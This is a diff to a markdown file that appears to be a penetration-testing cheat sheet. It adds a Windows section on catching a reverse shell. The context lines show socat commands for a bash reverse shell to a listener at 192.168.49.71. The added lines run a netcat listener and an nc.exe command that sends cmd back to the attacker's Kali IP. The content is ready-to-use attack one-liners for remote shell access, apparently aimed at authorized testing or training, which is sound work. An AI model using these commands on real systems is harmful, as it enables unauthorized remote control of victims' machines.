@@ -305,6 +305,12 @@ which socat
 socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
 ````
+### Windows
+This helps to create a more stable shell, upload nc32.exe or nc64.exe and catch a rever shell back to your kali machine
+````
+nc -nlvp 9001
+.\nc.exe <your kali IP> 9001 -e cmd
+````
 
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
 ### Tools
